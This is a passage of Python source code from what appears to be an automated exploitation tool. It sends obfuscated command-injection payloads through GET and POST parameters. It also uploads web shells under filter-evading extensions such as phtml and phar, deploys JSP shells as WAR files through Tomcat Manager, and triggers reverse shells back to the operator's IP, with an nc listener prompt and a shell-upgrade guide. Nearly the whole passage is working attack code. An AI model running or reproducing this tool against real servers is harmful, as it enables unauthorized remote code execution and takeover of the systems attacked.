                                success = self._send_command_post(url, param, variant_payload, extra_data)
                            else:  # GET
                                # Build full URL with existing params
                                extra_params = method_info.get('extra_params', {})
                                
                                # CRITICAL: Skip params that already exist in URL!
                                if param in extra_params:
                                    self.logger.info(f"    ⏭️  Skipping {param} (already in URL)")
                                    continue
                                
                                if extra_params:
                                    # Reconstruct URL with existing params
                                    param_strs = [f"{k}={v[0]}" for k, v in extra_params.items()]
                                    test_url = f"{url}?{'&'.join(param_strs)}"
                                else:
                                    test_url = url
                                
                                success = self._send_command_get(test_url, param, variant_payload)
                            
                            # Always ask after sending, regardless of HTTP status
                            time.sleep(2)
                            response = input("\n💡 Did you get a shell? [y/n] (default: n): ").strip().lower()
                            
                            if response == 'y':
                                self.logger.success("🎉 Shell confirmed!")
                                self.success = True
                                return
                            else:
                                # Default to 'n' if empty or anything else
                                self.logger.warning("No shell, trying next...")
                                break  # Break param loop, try next variant
                            
            except Exception as e:
                self.logger.error(f"Error with {payload_type}: {e}")
                continue
        
        self.logger.warning("⚠ All command payloads failed")
    
    def _load_shell_file(self, shell_filename: str) -> Optional[str]:
        """Load shell file from generators."""
        shell_path = os.path.join(
            os.path.dirname(__file__),
            '..',
            'generators',
            shell_filename
        )
        
        try:
            with open(shell_path, 'r') as f:
                return f.read()
        except FileNotFoundError:
            self.logger.error(f"Shell file not found: {shell_path}")
            return None
    
    def _customize_shell(self, shell_content: str) -> str:
        """Customize shell with IP and port."""
        customized = shell_content.replace('ip_here', self.vpn_ip)
        customized = customized.replace('port_here', str(self.selected_port))
        # Also support legacy placeholders
        customized = customized.replace('$IP', self.vpn_ip)
        customized = customized.replace('$PORT', str(self.selected_port))
        customized = customized.replace('LHOST', self.vpn_ip)
        customized = customized.replace('LPORT', str(self.selected_port))
        return customized
    
    def _get_filename_variants(self, base_name: str, base_extension: str) -> List[str]:
        """Get filename variants for obfuscation."""
        # Extension variants based on platform
        extension_map = {
            'php': ['php', 'php5', 'phtml', 'phar', 'inc', 'php3', 'php4', 'phps', 'pht', 'phpt'],
            'jsp': ['jsp', 'jspx', 'jsw', 'jsv', 'jspf'],
            'aspx': ['aspx', 'ashx', 'asmx', 'asp']
        }
        
        extensions = extension_map.get(base_extension, [base_extension])
        
        print(f"\n📦 Filename obfuscation options for {base_name}:")
        for i, ext in enumerate(extensions, 1):
            print(f"{i}. {base_name}.{ext}")
        print(f"{len(extensions) + 1}. All (try each one)")
        
        selection = input("\nSelect extensions (comma-separated, e.g., 1,3 or just press Enter for default): ").strip()
        
        selected_variants = []
        
        if not selection:
            # Default to first extension
            selected_variants = [f"{base_name}.{extensions[0]}"]
        else:
            indices = [s.strip() for s in selection.split(',')]
            for idx in indices:
                if idx.isdigit():
                    num = int(idx)
                    if num == len(extensions) + 1:  # All
                        selected_variants = [f"{base_name}.{ext}" for ext in extensions]
                        break
                    elif 1 <= num <= len(extensions):
                        selected_variants.append(f"{base_name}.{extensions[num-1]}")
        
        return selected_variants if selected_variants else [f"{base_name}.{extensions[0]}"]
    
    def _get_command_variants(self, base_payload: str, payload_type: str) -> List[Tuple[str, str]]:
        """Get command payload variants with evasion."""
        variants = [("Original", base_payload)]
        
        # Apply wrappers if enabled
        if self.enable_wrapper:
            if payload_type in ['bash', 'sh']:
                wrapped = self.wrapper.wrap_bash(base_payload)
                variants.extend(wrapped)
            elif payload_type in ['python', 'python3']:
                wrapped = self.wrapper.wrap_python(base_payload)
                variants.extend(wrapped)
            elif payload_type == 'php':
                wrapped = self.wrapper.wrap_php(base_payload)
                variants.extend(wrapped)
        
        # Apply obfuscation if enabled
        if self.enable_obfuscation:
            if payload_type in ['bash', 'sh']:
                obfuscated = self.obfuscator.obfuscate_bash(base_payload, self.vpn_ip, self.selected_port)
                variants.extend(obfuscated)
            elif payload_type in ['python', 'python3']:
                obfuscated = self.obfuscator.obfuscate_python(base_payload, self.vpn_ip, self.selected_port)
                variants.extend(obfuscated)
        
        return variants
#here
# Force Tomcat Manager detection and WAR deployment for manager endpoints
    def _upload_file(self, content: str, filename: str) -> bool:
        """Upload file to target - smart form handling (improved URL joining + checks)."""
        try:
            # Force Tomcat detection and WAR packaging for manager endpoints
            if 'manager' in str(self.upload_url).lower() and filename.lower().endswith('.jsp'):
                self.logger.info("Detected Tomcat Manager endpoint")
                self.is_tomcat = True
                
                war_base_name = os.path.splitext(filename)[0]
                war_content = self._package_jsp_to_war(content, war_base_name)
                
                self.logger.info("→ Using Tomcat Manager deployment API")
                return self._upload_tomcat_war(war_content, war_base_name)
            
            # Check if we need to package JSP into WAR for Tomcat
            is_jsp = filename.lower().endswith('.jsp')
            
            if self.is_tomcat and is_jsp:
                self.logger.info("Tomcat detected - converting JSP to WAR format")
                
                # Extract base name (e.g., "shell" from "shell.jsp")
                war_base_name = os.path.splitext(filename)[0]
                
                # Package into WAR
                war_content = self._package_jsp_to_war(content, war_base_name)
                
                # Check if upload URL is Tomcat Manager - use deployment API
                if 'manager' in str(self.upload_url).lower():
                    self.logger.info("→ Using Tomcat Manager deployment API")
                    return self._upload_tomcat_war(war_content, war_base_name)
                
                # Otherwise treat as regular multipart upload
                filename = f"{war_base_name}.war"
                content = war_content
                
                self.logger.info(f"→ Uploading as: {filename}")
            
            self.logger.loading(f"Uploading {filename}")

            # CRITICAL: Get the upload page first to receive session cookie
            try:
                self.logger.info("Getting upload page to establish session...")
                initial_response = self.session.get(self.upload_url, timeout=10)
                self.logger.info(f"Session cookies: {self.session.cookies.get_dict()}")

                soup = BeautifulSoup(initial_response.text, 'html.parser')

                # Find the form
                form = soup.find('form')
                if not form:
                    self.logger.error("No form found on upload page")
                    return False

                # Debug: show a small snippet of the form for troubleshooting
                form_html = str(form)[:1000]
                self.logger.info(f"Form snippet: {form_html}")

                # Get form action
                action = form.get('action', '')
                # Ensure urljoin treats upload_url as a directory when the action is relative.
                # If upload_url does not end with a slash, urljoin can remove the last path segment.
                base_for_join = self.upload_url
                if not base_for_join.endswith('/'):
                    base_for_join = base_for_join + '/'

                # If action is absolute, use it; otherwise join with the base_for_join
                if action and (action.lower().startswith('http://') or action.lower().startswith('https://')):
                    upload_post_url = action
                elif action:
                    upload_post_url = urljoin(base_for_join, action)
                else:
                    # If no action, POST to the same URL (directory-like)
                    upload_post_url = base_for_join

                # Get form method
                method = form.get('method', 'post').lower()

                # Identify enctype
                enctype = form.get('enctype', '').lower()
                if 'multipart' not in enctype:
                    # warn but continue — many forms will require multipart/form-data for file uploads
                    self.logger.warning("Form does not declare 'multipart/form-data' enctype; upload may fail")

                # Find file input field
                file_input = form.find('input', {'type': 'file'})
                file_field_name = file_input.get('name', 'file') if file_input else 'file'

                # Collect all other form fields (including hidden CSRF tokens)
                form_data = {}
                for inp in form.find_all('input'):
                    inp_name = inp.get('name')
                    inp_type = inp.get('type', 'text').lower()
                    inp_value = inp.get('value', '')

                    if not inp_name:
                        continue

                    if inp_type == 'file':
                        continue

                    # Preserve hidden/token values; for text/email fields only set username if empty
                    if inp_type in ['text', 'email'] and not inp_value and self.username:
                        # Only fill if a username is available; otherwise leave blank
                        form_data[inp_name] = self.username
                    else:
                        form_data[inp_name] = inp_value

                # Check for textarea/select fields
                for textarea in form.find_all('textarea'):
                    name = textarea.get('name')
                    if name:
                        form_data[name] = textarea.text

                for select in form.find_all('select'):
                    name = select.get('name')
                    if name:
                        option = select.find('option')
                        if option:
                            form_data[name] = option.get('value', '')

                self.logger.info(f"Form action: {upload_post_url}")
                self.logger.info(f"Form method: {method.upper()}, enctype: {enctype or 'not set'}")
                self.logger.info(f"File field name: {file_field_name}")
                self.logger.info(f"Additional form data keys: {list(form_data.keys())}")

            except Exception as e:
                self.logger.warning(f"Could not parse form: {e}")
                file_field_name = 'file'
                # Ensure the upload_url used for posting is directory-like
                upload_post_url = self.upload_url if self.upload_url.endswith('/') else (self.upload_url + '/')
                method = 'post'
                form_data = {'submit': 'Upload'}

            # Prepare file upload with correct MIME type based on extension
            ext = filename.split('.')[-1].lower()
            mime_map = {
                'php': 'application/x-php',
                'phtml': 'application/x-php',
                'jsp': 'text/plain',
                'aspx': 'text/plain',
                'txt': 'text/plain',
                'jpg': 'image/jpeg',
                'png': 'image/png'
            }
            mime_type = mime_map.get(ext, 'application/octet-stream')
            files = {file_field_name: (filename, content, mime_type)}

            # If the form method is GET, simulate a GET - note GET is not suitable for file uploads;
            # warn and attempt to submit form fields only (without file).
            if method == 'get':
                self.logger.warning("Form uses GET; performing a GET with form fields (files cannot be sent via GET)")
                try:
                    self.logger.loading("Sending GET request to form action...")
                    response = self.session.get(upload_post_url, params=form_data, timeout=15, allow_redirects=True)
                    upload_response = response
                except Exception as e:
                    self.logger.error(f"GET upload attempt failed: {e}")
                    return False
            else:
                # Perform upload via POST (multipart)
                self.logger.loading("Sending upload request...")
                self.logger.info(f"Uploading to: {upload_post_url}")
                self.logger.info(f"File: {filename} ({len(content)} bytes)")
                self.logger.info(f"Form data keys: {list(form_data.keys())}")

                try:
                    upload_response = self.session.post(
                        upload_post_url,
                        files=files,
                        data=form_data,
                        timeout=15,
                        allow_redirects=True
                    )
                except Exception as e:
                    self.logger.error(f"Upload request failed: {e}")
                    return False

            self.logger.info(f"Upload response: HTTP {getattr(upload_response, 'status_code', 'N/A')}")
            response_text = getattr(upload_response, 'text', '') or ''
            self.logger.info(f"Response length: {len(response_text)} bytes")

            # Heuristics for success/failure
            response_lower = response_text.lower()
            success_indicators = [
                'success', 'uploaded', 'complete', 'done', 'file has been',
                filename.lower(), 'successfully', 'saved', 'received'
            ]
            error_indicators = [
                'error', 'failed', 'invalid', 'not allowed', 'forbidden',
                'denied', 'rejected', 'extension', 'type not allowed'
            ]

            # Check for clear errors
            if any(error in response_lower for error in error_indicators):
                self.logger.error("Upload rejected by server")
                self.logger.error(f"Response: {response_text[:500]}")
                return False

            # If HTTP indicates success (200/201/302), look for success indicators or try to verify
            status = getattr(upload_response, 'status_code', None)
            if status in [200, 201, 202, 302]:
                if any(indicator in response_lower for indicator in success_indicators):
                    self.logger.success("✓ Upload appears successful (response indicated success)")

                    # Try to verify file exists if execute_path known
                    if self.execute_path:
                        exec_path = self.execute_path if self.execute_path.endswith('/') else (self.execute_path + '/')
                        verify_url = urljoin(exec_path, filename)
                        try:
                            self.logger.info(f"Verifying file at: {verify_url}")
                            verify_response = self.session.get(verify_url, timeout=5, allow_redirects=True)
                            if verify_response.status_code == 200:
                                self.logger.success(f"✓ Verified: File accessible at {verify_url}")
                                return True
                            else:
                                self.logger.warning(f"File not found at {verify_url} (HTTP {verify_response.status_code})")
                        except Exception:
                            pass

                    return True
                else:
                    # Try to verify using execute_path before asking user
                    if self.execute_path:
                        exec_path = self.execute_path if self.execute_path.endswith('/') else (self.execute_path + '/')
                        verify_url = urljoin(exec_path, filename)
                        self.logger.info(f"Checking if file exists at: {verify_url}")
                        try:
                            verify_response = self.session.get(verify_url, timeout=5)
                            if verify_response.status_code == 200:
                                # Heuristic: if content-type looks like code or length is significant, assume success
                                ct = verify_response.headers.get('content-type', '').lower()
                                if 'php' in ct or len(verify_response.text) > 100:
                                    self.logger.success(f"✓ File verified at {verify_url}")
                                    return True
                                else:
                                    self.logger.warning(f"File at {verify_url} does not look like executable code")
                            else:
                                self.logger.warning(f"File not found at {verify_url} (HTTP {verify_response.status_code})")
                        except Exception as e:
                            self.logger.warning(f"Could not verify file: {e}")

                    # Fallback: show limited response and ask user (interactive)
                    self.logger.info(f"Partial response:\n{response_text[:800]}\n")
                    if input("Does the upload appear successful? Check /uploads/ manually if needed. [y/n]: ").strip().lower() in ['y', 'yes']:
                        return True
                    return False
            else:
                self.logger.error(f"Upload failed: HTTP {status}")
                self.logger.error(f"Response: {response_text[:500]}")
                return False

        except Exception as e:
            self.logger.error(f"Upload error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _execute_uploaded_shell(self, filename: str) -> bool:
        """Execute uploaded shell."""
        if not self.execute_path:
            self.logger.warning("No execution path provided, skipping execution")
            return False
        
        # Ensure execute_path ends with / for proper URL joining
        exec_path = self.execute_path
        if not exec_path.endswith('/'):
            exec_path += '/'
        
        shell_url = urljoin(exec_path, filename)
        
        self.logger.info(f"📍 Shell URL: {shell_url}")
        self.logger.info(f"🎧 Start listener: nc -lvnp {self.selected_port}")
        input("\n⏳ Press Enter when listener is ready...")
        
        self.logger.loading("Triggering shell")
        
        try:
            requests.get(shell_url, timeout=3)
        except requests.exceptions.Timeout:
            pass  # Timeout expected if shell connects
        except Exception as e:
            self.logger.warning(f"Trigger error (may be normal): {e}")
        
        time.sleep(2)
        return True
    
    def _send_command_get(self, url: str, param: str, payload: str) -> bool:
        """Send command payload via GET request."""
        try:
            if '?' in url:
                full_url = f"{url}&{param}={requests.utils.quote(payload)}"
            else:
                full_url = f"{url}?{param}={requests.utils.quote(payload)}"
            
            self.logger.info(f"  Sending GET: {param}={payload[:50]}...")
            response = self.session.get(full_url, timeout=5, verify=False)
            
            # Force the response to be read and connection to close
            _ = response.text
            response.close()
            
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            self.logger.warning(f"  GET error: {e}")
            return False
    
    def _send_command_post(self, url: str, param: str, payload: str, extra_data: dict = None) -> bool:
        """Send command payload via POST request."""
        try:
            post_data = extra_data.copy() if extra_data else {}
            post_data[param] = payload
            
            self.logger.info(f"  Sending POST: {param}={payload[:50]}...")
            response = self.session.post(url, data=post_data, timeout=5, verify=False)
            
            # Force the response to be read and connection to close
            _ = response.text
            response.close()
            
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            self.logger.warning(f"  POST error: {e}")
            return False
    
    def _wait_for_key(self) -> str:
        """Wait for ENTER or SPACE key."""
        import sys
        import tty
        import termios
        
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        
        try:
            tty.setraw(fd)
            char = sys.stdin.read(1)
            
            if char == '\r' or char == '\n':
                return 'enter'
            elif char == ' ':
                return 'space'
            else:
                return 'other'
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            print()  # New line after key press
    
    def _extract_base_url(self, url: str) -> str:
        """Extract base URL from full URL."""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def _display_summary(self):
        """Display execution summary."""
        self.logger.separator()
        self.logger.header("📊 Summary")
       
        if self.success:
            self.logger.success("\n🎉 Exploitation successful!")
            self.logger.info("\n🐚 Shell Upgrade Guide:")
            self.logger.list_item("1. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
            self.logger.list_item("2. Press Ctrl+Z, then on YOUR terminal: stty raw -echo; fg")
            self.logger.list_item("3. export TERM=xterm-256color")
            self.logger.list_item("4. stty rows 38 columns 116")
            self.logger.list_item("5. reset")
            self.logger.info("💡 Tip: Run 'stty size' on your terminal for accurate dimensions")
            self.logger.info("✅ Result: Tab complete, history, safe Ctrl+C!\n")
        else:
            self.logger.warning("\n⚠ Exploitation unsuccessful")
            self.logger.info("Troubleshooting:")
            self.logger.list_item("• Verify vulnerability exists")
            self.logger.list_item("• Check firewall/filtering")
            self.logger.list_item("• Try different ports")
            self.logger.list_item("• Manual exploitation may be needed")
